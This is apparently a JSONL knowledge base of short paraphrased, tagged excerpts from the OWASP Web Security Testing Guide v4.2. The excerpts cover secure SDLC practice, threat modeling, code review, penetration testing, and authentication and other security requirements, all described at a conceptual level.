{"id": "kb-000001", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Insecure software is a significant technical challenge in the context of rising web applications and the need for robust security measures."}
{"id": "kb-000002", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The OWASP Testing Guide aims to standardize and improve web application security testing, making insecure software the exception rather than the norm. Security testing must be integrated into the standard software development process rather than treated as a separate task."}
{"id": "kb-000003", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security testing alone cannot guarantee security due to the infinite number of potential attack vectors; security must be viewed through a broader lens."}
{"id": "kb-000004", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "OWASP encourages collaboration among security professionals to develop effective security testing practices, captured through the contributions of a global community of experts."}
{"id": "kb-000005", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Providing security knowledge and testing techniques openly democratizes security practices, allowing developers, QA teams, and managers to engage actively with security issues."}
{"id": "kb-000006", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The guide encourages developers to take primary responsibility for application security as they create the code, necessitating awareness and testing for vulnerabilities."}
{"id": "kb-000007", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "The document emphasizes the importance of keeping security information up to date in light of evolving threats, utilizing a wiki approach to incorporate community contributions. Organizations should tailor the web security testing guide to match their specific technologies and processes. Different roles using this guide include: - Developers: Ensure secure code is produced; integrate testing into normal code and unit testing procedures. - Software testers and QA: Expand test cases to catch vulnerabilities early, saving time and effort. - Security specialists: Combine this guide with other techniques to verify that no security holes have been missed. - Project Managers: Understand that security issues manifest as bugs in code and design. Continuous re-prioritization is key in security testing due to the infinite possibilities of application failure and limited resources. Focus on security holes that present real risks to the business by contextualizing risks according to application use cases. The guide should be viewed as a set of techniques rather than a checklist, as current and emerging vulnerabilities must be accounted for."}
{"id": "kb-000008", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Automated security tools have limitations; they cannot make software secure on their own, but they can help scale the process and enforce security policy."}
{"id": "kb-000009", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "Automated tools are generally not designed for custom code and tend to find generic problems; serious security issues usually relate to specific business logic. An effective security strategy balances automated tool usage with the methodologies described in the testing guide. The importance of familiarizing oneself with security testing guidance in software development, design, and testing processes."}
{"id": "kb-000010", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The OWASP Testing Project aims to provide a comprehensive testing framework for web applications, emphasizing understanding the what, why, when, where, and how of testing."}
{"id": "kb-000011", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The Testing Guide serves as a template for building custom testing programs and can validate existing processes, moving beyond simple checklists to a more holistic approach."}
{"id": "kb-000012", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The transition of web application testing focus from penetration testing to integration within the software development life cycle is a key aspect of the Testing Guide."}
{"id": "kb-000013", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "One of the main goals of the OWASP Testing Project is to help organizations test web applications to create reliable and secure software, rather than just identifying weaknesses."}
{"id": "kb-000014", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The OWASP testing framework is validated by industry experts and security professionals, emphasizing consensus and collective experience in its development."}
{"id": "kb-000015", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An important quote presented in the text highlights a key principle in software engineering: \"You can't control what you can't measure,\" underscoring the need for measurement in security testing. Measuring security is complex, involving both technical vulnerabilities and their economic implications for the business."}
{"id": "kb-000016", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Quantifying the cost of vulnerabilities in financial terms is critical for CIOs to assess security investments and properly budget for software security initiatives."}
{"id": "kb-000017", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The Consortium for IT Software Quality noted that the cost of poor quality software in the US was approximately $2.84 trillion in 2018, highlighting the immense economic impact of software vulnerabilities. Web security testing is critical due to the exposure of web applications to millions of users. Testing is defined as a procedure to establish the quality, performance, or reliability of a system before widespread use. In the context of web applications, testing involves comparing the status of a system against specific criteria."}
{"id": "kb-000018", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security testing is often viewed as ambiguous, but the goal is to demystify it and provide actionable steps for those without deep security knowledge."}
{"id": "kb-000019", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The guide serves as a reference for organizations to understand the components of a web application testing program and identify steps to build it effectively."}
{"id": "kb-000020", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "It aims to bridge the gap between current practices and industry best practices, allowing for comparisons with peers and resource estimates for testing."}
{"id": "kb-000021", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing should not be reserved for the deployment phase of the software development life cycle (SDLC); integrating security at every phase of the SDLC is critical to reduce the likelihood of security vulnerabilities in production applications."}
{"id": "kb-000022", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The document indicates that adopting a mature SDLC can help mitigate security issues and highlights the rising costs associated with fixing these bugs later in the development process."}
{"id": "kb-000023", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Companies should inspect their overall Software Development Life Cycle (SDLC) to ensure that security is integral to the development process."}
{"id": "kb-000024", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "SDLC should include security tests to verify that security is adequately covered and controls are effective throughout the development process. Software development is a combination of people, process, and technology that must be tested to ensure effectiveness. An effective testing program should include components that focus on the following aspects: 1. People: Ensure adequate education and awareness regarding security. 2. Process: Verify that there are adequate policies and standards in place, and that employees understand how to follow these policies. 3. Technology: Validate that the security processes have been effectively implemented."}
{"id": "kb-000025", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing a web application must take a holistic approach, addressing not only technical aspects but also management and operational vulnerabilities to identify root causes of defects early."}
{"id": "kb-000026", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Denis Verdon compares testing applications to safety testing cars, emphasizing that comprehensive testing must include various impact scenarios rather than focusing on just frontal impact."}
{"id": "kb-000027", "section": null, "tags": ["INFO"], "source": "wstg-v4.2.pdf", "text": "Web Security Testing Guide scenarios follow a specific identifier format WSTG-<category>-<number>, with an example being WSTG-INFO-02 indicating the second Information Gathering test."}
{"id": "kb-000028", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "It's recommended to include the version in identifiers for clarity during documentation to avoid confusion with future versions, e.g., WSTG-v42-INFO-02 for version 4.2."}
{"id": "kb-000029", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Links to scenarios should be versioned to prevent issues with outdated references, such as using https://owasp.org/www-project-web-security-testing-guide/v42/... for version 4.2 components."}
{"id": "kb-000030", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "There is no 'silver bullet' for application security; security is a continuous process requiring more than just scanners and firewalls to address deeper vulnerabilities effectively."}
{"id": "kb-000031", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The patch-and-penetrate model, prevalent in the 1990s, emphasizes fixing bugs without understanding the underlying issues, reinforcing the idea that security professionals should think strategically about vulnerabilities rather than tactically."}
{"id": "kb-000032", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Vulnerability studies highlight that the reaction time of attackers is decreasing, leading to a shrinking window of vulnerability which does not provide sufficient time for patch installation."}
{"id": "kb-000033", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Many users incorrectly assume that applying patches might interfere with normal operations or could break existing applications, leading to inconsistency in patch application among users. Not all users are aware of newly released patches, impacting their application of necessary updates."}
{"id": "kb-000034", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Integrating security into the Software Development Life Cycle (SDLC) is crucial for preventing recurring security issues within applications."}
{"id": "kb-000035", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Developers should create standards, policies, and guidelines that integrate security within the SDLC to align with existing development methodologies. Threat modeling should be implemented to allocate appropriate resources to system components most vulnerable to threats."}
{"id": "kb-000036", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The SDLC is an established process among developers, and incorporating security measures into each phase facilitates a comprehensive approach to application security."}
{"id": "kb-000037", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Each phase of the SDLC (define, design, develop, deploy, maintain) contains security considerations that need to be embedded in the existing development processes for effective security management."}
{"id": "kb-000038", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Several secure SDLC frameworks exist that offer either descriptive or prescriptive advice depending on the maturity of the organization's SDLC process."}
{"id": "kb-000039", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Prescriptive frameworks provide a menu of potential security controls for implementation, while descriptive frameworks share practical insights from real-world applications."}
{"id": "kb-000040", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Notable frameworks include BSIMM (descriptive) and OWASP’s Open Software Assurance Maturity Model (OpenSAMM) and ISO/IEC 27034 Parts 1-7 (prescriptive)."}
{"id": "kb-000041", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "When a bug is detected early within the Software Development Life Cycle (SDLC), it can be addressed faster and at a lower cost, highlighting the importance of early bug detection."}
{"id": "kb-000042", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Educating development and QA teams about common security issues and their detection and prevention can lead to more secure software development."}
{"id": "kb-000043", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "The integration of security testing into Continuous Integration/Continuous Deployment (CI/CD) workflows is essential in modern methodologies such as Agile, DevOps/DevSecOps, and Rapid Application Development (RAD)."}
{"id": "kb-000044", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "Dynamic Application Security Testing (DAST), Static Application Security Testing (SAST), and Software Composition Analysis (SCA) tools should be leveraged during automated release workflows to maintain security standards."}
{"id": "kb-000045", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The scope of security for a project should be well understood, with assets classified according to their required level of protection (e.g., confidential, secret, top secret)."}
{"id": "kb-000046", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Legal discussions are important to ensure compliance with regulations such as the Gramm-Leach-Bliley Act in the USA and the General Data Protection Regulation (GDPR) in the EU."}
{"id": "kb-000047", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Creative thinking is necessary for effective security testing; testers should think like attackers to identify vulnerabilities that automated tools may miss."}
{"id": "kb-000048", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Accurate documentation of applications should be a fundamental part of any security program, including architectural and data-flow diagrams for effective security assessments."}
{"id": "kb-000049", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The choice of tools is critical; understanding the capabilities of both Open Source and commercial security tools is necessary to avoid misuse or underuse."}
{"id": "kb-000050", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Overlooking details in security reviews can lead to a false sense of security; a thorough review is essential to identify and address all potential vulnerabilities. Every aspect of application logic should be tested to explore potential vulnerabilities during web security testing."}
{"id": "kb-000051", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "While black-box penetration tests can provide useful insights, they are not the most effective way to secure an application due to their limitations in examining the entire code base."}
{"id": "kb-000052", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Dynamic testing is often hindered by complex code structures, making it vital to utilize source code when available for a thorough security review. Identifying vulnerabilities within application source code can reveal risks that may be overlooked during black-box testing."}
{"id": "kb-000053", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Developing metrics is essential for tracking the security progress of applications; metrics can indicate the need for more training, understanding of security mechanisms, or declining security problems. Consistent, automated metrics can change how organizations address and reduce security bugs in software development."}
{"id": "kb-000054", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Documenting test results is critical: records should specify testing actions, personnel involved, dates, and findings to inform stakeholders and facilitate future measures."}
{"id": "kb-000055", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Test reports should be clear and accessible, aligning with the needs of various stakeholders including business owners, developers, and auditors."}
{"id": "kb-000056", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Using standardized templates for security reports can streamline documentation, ensuring accuracy, clarity, and consistency in communication of results. Manual inspections are human reviews that test the security implications of policies, processes, and technology decisions. Manual inspections include the analysis of documentation and interviews with designers or system owners. These inspections are powerful tools to assess security concerns and ensure adherence to security processes in software development. The trust-but-verify model is essential when conducting manual inspections, as not everything presented may be accurate."}
{"id": "kb-000057", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Manual reviews assess individual understanding of the security process, awareness of policy, and skills in implementing secure applications. Manual inspections can review documentation, secure coding policies, security requirements, and architectural designs."}
{"id": "kb-000058", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Advantages of manual inspections: no supporting technology required, applicability to diverse situations, flexibility, promotes teamwork, and useful early in the Software Development Life Cycle (SDLC). Disadvantages include being time-consuming, potential lack of supporting material, and requiring significant human skill to be effective. Threat modeling is a popular technique for identifying security threats in systems and applications, acting as a risk assessment tool. It helps designers create mitigation strategies for vulnerabilities and prioritize resources effectively. It is recommended to develop and document a threat model early in the SDLC and update it as the application evolves."}
{"id": "kb-000059", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The recommended approach for threat modeling follows NIST 800-30 standard and involves: decomposing the application, defining and classifying assets, exploring potential vulnerabilities, identifying potential threats, and creating mitigation strategies."}
{"id": "kb-000060", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Threat modeling can vary in output but typically includes lists and diagrams, aiding in identifying potential security flaws in application design."}
{"id": "kb-000061", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Various open source projects and commercial products offer methodologies for application threat modeling, but there is no single correct approach to developing threat models."}
{"id": "kb-000062", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Source code review is a crucial process for identifying security issues in web applications, as many vulnerabilities cannot be detected through other testing methods."}
{"id": "kb-000063", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "It is commonly agreed that examining the source code is the most effective way to understand security problems, as all relevant information is contained within it."}
{"id": "kb-000064", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Unintentional but significant security problems can often be missed in penetration testing but can be discovered through thorough source code analysis."}
{"id": "kb-000065", "section": null, "tags": ["AUTHZ", "BUSINESS", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Source code reviews can identify issues such as concurrency problems, flawed business logic, access control weaknesses, and various forms of malicious code, including backdoors and logic bombs. Source code analysis is efficient in finding implementation issues related to input validation and fail-open control procedures."}
{"id": "kb-000066", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Some advantages of source code review include its completeness, effectiveness, and accuracy, making it a fast technique when reviewed by skilled professionals."}
{"id": "kb-000067", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Challenges of source code review include the requirement for highly skilled developers, the potential to miss issues in compiled libraries, and the risk that the source code analyzed may not match the deployed version."}
{"id": "kb-000068", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Penetration testing is an effective network security technique, known as black-box testing or ethical hacking, used to find security vulnerabilities remotely without knowing the target's inner workings. Penetration testers act as attackers to exploit vulnerabilities, often using valid accounts on a system."}
{"id": "kb-000069", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The application of penetration testing to web applications is more complicated due to their bespoke nature, rendering automated tools often less effective."}
{"id": "kb-000070", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Gary McGraw stated, 'In practice, a penetration test can only identify a small representative sample of all possible security risks in a system.'"}
{"id": "kb-000071", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Advantages of penetration testing include speed and cost-effectiveness, as well as requiring a lower skill set compared to source code reviews. Disadvantages include being too late in the Software Development Life Cycle (SDLC) and focusing only on front-impact testing."}
{"id": "kb-000072", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A balanced approach to security testing is recommended, incorporating multiple techniques throughout all phases of the SDLC rather than relying solely on penetration testing. Testing frameworks need to adapt based on factors like the maturity of the testing process and corporate culture. Automated web application scanners have limitations and may not be completely effective for black-box testing."}
{"id": "kb-000073", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The OWASP Benchmark Project is a test suite for evaluating the performance of automated vulnerability detection tools, focusing on speed, coverage, and accuracy. Understanding the limitations of automated tools is crucial for developing effective testing frameworks."}
{"id": "kb-000074", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Example of a weakness in automated testing: a web application with a 'magic' parameter that accepts complex values allows unauthorized access through a hidden administrative backdoor. The parameter's complexity (30-character value) makes it difficult for scanners to guess effectively. Automated scanners may struggle with applications that have obfuscated elements, such as hidden administrative features."}
{"id": "kb-000075", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The complexity of vulnerability detection can be illustrated by the example of the 'Magic Parameter' check, where a simple comparison of a parameter string could lead to significant security implications if not identified during code review."}
{"id": "kb-000076", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "In the case of bad cryptography, a developer using an MD5 hash for signing in users between sites can create security vulnerabilities that are exploitable if the hash generation method is understood by an attacker."}
{"id": "kb-000077", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Static source code review tools, while helpful, cannot solely replace manual code inspection as they cannot understand the context of the code or identify design flaws, necessitating significant manual effort to verify findings."}
{"id": "kb-000078", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security testing objectives should include validating that security controls are functioning as intended, thereby ensuring the confidentiality, integrity, and availability of data, as well as checking for known vulnerabilities like those listed in the OWASP Top Ten."}
{"id": "kb-000079", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Effective security requirements documentation must stem from both applicable standards and regulations and the specific functionalities and limitations of the application as stipulated by positive and negative requirements."}
{"id": "kb-000080", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The first step in security requirements documentation is to understand business requirements, which may include protecting customer data and complying with applicable security regulations."}
{"id": "kb-000081", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A security section in the business requirements can indicate the necessity to adhere to specific security regulations, standards, and policies relevant to the application."}
{"id": "kb-000082", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Compliance checks on applicable regulations, such as FFIEC for financial applications, dictate technical requirements like implementing multi-factor authentication to mitigate weak authentication risks."}
{"id": "kb-000083", "section": null, "tags": ["API", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Industry standards like PCI DSS require specific security controls regarding customer credit card data, including restrictions on storing sensitive data like PINs and CVV2, and the necessity for encryption in storage and transmission."}
{"id": "kb-000084", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Security requirements should align with organizational information security standards, such as enforcing password complexity (e.g., ten alphanumeric characters) as part of the application's authentication controls."}
{"id": "kb-000085", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Validation of security requirements is crucial for both security testing and information security assessments; the aim is to identify gaps in security controls and assess the potential risks to confidentiality, integrity, and availability of data."}
{"id": "kb-000086", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Examples of security requirements include needing to validate that only certain encryption algorithms (e.g., SHA-256, RSA, AES) and key lengths are used to comply with organizational encryption standards."}
{"id": "kb-000087", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Different phases of the Software Development Life Cycle (SDLC) involve different testing methodologies: threat modeling identifies design flaws; secure code analysis focuses on source code; while penetration testing assesses application vulnerabilities."}
{"id": "kb-000088", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security risks identified early in the SDLC can be documented in a test plan for later validation, enhancing the effectiveness of security tests and overall assurance of security measures."}
{"id": "kb-000089", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The first evidence of a potential SQL injection vulnerability is the generation of a SQL exception, which may be validated by manually injecting attack vectors to modify the grammar of SQL queries for information disclosure exploits."}
{"id": "kb-000090", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Tester may expedite validation of SQL vulnerabilities by performing source code analysis, allowing them to construct SQL attack vectors that can successfully exploit the vulnerability."}
{"id": "kb-000091", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Threat and countermeasure classification helps verify that security controls mitigate the impact of vulnerabilities and is important for developing security requirements. OWASP Top Ten vulnerabilities provide a useful framework for identifying common vulnerabilities and establishing security requirements."}
{"id": "kb-000092", "section": null, "tags": ["AUTHN", "AUTHZ", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Threat categorization can be performed using STRIDE, which stands for Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, and Elevation of privilege. A common coding error in authentication controls is not applying a seed to hashed passwords, which constitutes a security flaw in coding."}
{"id": "kb-000093", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A vulnerability knowledge base can aid in documenting security issues by type, issue, mitigation, and root cause, which assists in risk analysis and mitigation strategy formulation."}
{"id": "kb-000094", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Security risks can be assessed through source code analysis and penetration testing, validating vulnerabilities such as SQL injection by probing input fields with attack vectors."}
{"id": "kb-000095", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Vulnerabilities are prioritized for remediation based on risk ratings, allowing organizations to address high and medium risks before low risks."}
{"id": "kb-000096", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Threat scenarios can be mapped to broader attack types (e.g., phishing, identity theft) and should be documented to inform security testing and validation strategies."}
{"id": "kb-000097", "section": null, "tags": ["AUTHN", "AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Web security testing focuses on validating the mitigation of impacts from vulnerabilities related to authentication, cryptographic controls, input validation, and authorization controls."}
{"id": "kb-000098", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Functional security requirements, also known as positive requirements, specify expected functionalities which can be validated through security tests, such as user lockout after failed login attempts or minimum password length requirements."}
{"id": "kb-000099", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Examples of functional security requirements include: 'the application will lockout the user after six failed log on attempts' and 'passwords need to be a minimum of ten alphanumeric characters.'"}
{"id": "kb-000100", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Validation of security requirements involves testing implemented functionalities against expected conditions, resulting in either a pass or fail outcome."}
{"id": "kb-000101", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "High-level security design requirements for authentication may include protecting user credentials, masking confidential data, and limiting the attack surface by enforcing stringent password policies."}
{"id": "kb-000102", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Risk-driven security requirements focus on validating unexpected behaviors or negative requirements, such as ensuring data cannot be altered or preventing unauthorized transactions."}
{"id": "kb-000103", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Negative requirements are more challenging to test since they involve verifying the absence of expected behavior, necessitating thorough risk analysis and threat modeling."}
{"id": "kb-000104", "section": null, "tags": ["AUTHN", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Documentation of threat scenarios and countermeasures is essential; for instance, encrypting authentication data in storage and transit helps mitigate risks associated with information disclosure and authentication protocol attacks."}
{"id": "kb-000105", "section": null, "tags": ["AUTHN", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "The use of non-reversible encryption methods, like hashing passwords with a seed, is essential to prevent attacks such as dictionary attacks."}
{"id": "kb-000106", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Locking out accounts after reaching a login failure threshold and enforcing password complexity are recommended practices to mitigate brute force password attacks. Generic error messages should be displayed upon credential validation to reduce risks of account harvesting and enumeration. Mutual authentication between client and server can prevent non-repudiation and manipulator in the middle (MiTM) attacks."}
{"id": "kb-000107", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Threat modeling tools like threat trees and attack libraries help derive negative test scenarios; for example, a threat tree visualizes possible exploits and necessary countermeasures to address security control failures."}
{"id": "kb-000108", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Use cases describe the intended functionality of applications and include actors, relationships, and sequences of actions to highlight expected behavior."}
{"id": "kb-000109", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Misuse cases define scenarios of malicious use and help uncover potential vulnerabilities by analyzing how applications can be exploited by attackers."}
{"id": "kb-000110", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Identifying critical misuse and abuse cases is essential for documenting security requirements and controls necessary to mitigate security risks."}
{"id": "kb-000111", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "A step-by-step methodology for deriving security requirements includes: 1) Describing a functional scenario (e.g., user authentication process), 2) Describing a negative scenario (e.g., brute force attacks), and 3) Graphically representing both scenarios to inform countermeasures."}
{"id": "kb-000112", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Functional and negative scenarios can be graphically depicted to clarify user actions and identify possible attacks, thus enhancing understanding and planning for security measures. Security requirements for authentication include: 1. Password complexity should adhere to current standards. 2. User accounts should automatically lock after five unsuccessful login attempts. 3. Login error messages should be generic to avoid leaking information about account existence or password validity."}
{"id": "kb-000113", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security testing during the development phase of the SDLC (Software Development Life Cycle) allows for the assessment of individual software components for security vulnerabilities before integration. Software components include functions, methods, classes, APIs, libraries, and executable files."}
{"id": "kb-000114", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Developers can utilize source code analysis to perform static verification of code against secure coding standards, helping to identify potential vulnerabilities early in development. Security unit tests verify the functionality of components dynamically at runtime, ensuring they operate as expected."}
{"id": "kb-000115", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The responsibility of validating the source code before integration into application builds typically lies with senior developers, who lead the secure code review process."}
{"id": "kb-000116", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A secure code review involves deciding whether the code will be accepted for the application build, or if further changes and testing are necessary."}
{"id": "kb-000117", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security testing occurs at different levels, notably during integrated testing and system level testing, validating both functionality and exposure to vulnerabilities."}
{"id": "kb-000118", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "White-box testing (source code analysis) and black-box testing (penetration testing) are two main approaches to security testing, with gray-box testing combining elements of both."}
{"id": "kb-000119", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "Testing engineers typically conduct security tests, leveraging knowledge of web application vulnerabilities and testing techniques, to ensure security requirements are met in the integration environment. Testing guidelines and procedures are essential for documenting security test cases, underlining their importance in the testing workflow."}
{"id": "kb-000120", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "During the validation phase, QA testers handle functional testing while specialized security teams or consultants conduct the security assessments."}
{"id": "kb-000121", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Recommendations for addressing security issues may involve code or design changes, and high-risk vulnerabilities typically need to be resolved prior to production deployment. The primary objective of security testing during the coding phase is to ensure that code adheres to secure coding standards."}
{"id": "kb-000122", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security tests validate developers' coding artifacts such as functions, methods, classes, APIs, and libraries before integration into the application. Developers should follow documented secure coding standards and conduct static and dynamic analysis to validate security requirements."}
{"id": "kb-000123", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Unit tests can verify that code changes resulting from secure code reviews are correctly implemented, enhancing the security posture of the application. Static analysis tools and secure code reviews are critical for identifying security issues during code development."}
{"id": "kb-000124", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Developers should create a generic security test suite as part of the existing unit testing framework, which can be informed by predefined use and misuse cases."}
{"id": "kb-000125", "section": null, "tags": ["AUTHN", "AUTHZ", "CRYPTO", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Security test cases should cover critical areas such as identity, authentication & access control, input validation & encoding, encryption, user/session management, error handling, and auditing/logging. Integrating a source code analysis tool into the IDE helps developers assess software component security effectively."}
{"id": "kb-000126", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Unit tests can specifically validate security functionality, including authentication checks, data protection, error handling, and auditing/logging procedures."}
{"id": "kb-000127", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Test cases can assert proper functionality of security controls and validate input/output sanitation, ensuring secure handling of user inputs."}
